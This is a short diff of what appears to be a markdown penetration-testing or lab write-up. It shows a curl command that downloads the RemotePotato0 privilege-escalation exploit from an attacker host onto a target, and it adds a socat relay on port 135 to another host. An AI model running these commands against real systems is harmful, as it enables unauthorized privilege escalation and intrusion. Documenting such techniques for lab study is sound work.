@@ -637,5 +637,12 @@ curl http://10.200.52.144:8000/RemotePotato0.exe -o rp.exe
 Now its on the target
 
 ```python
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.18.23:8080
+```
+Ill set a socat listener
+
+Using the target IP
+
+```python
 
 ```
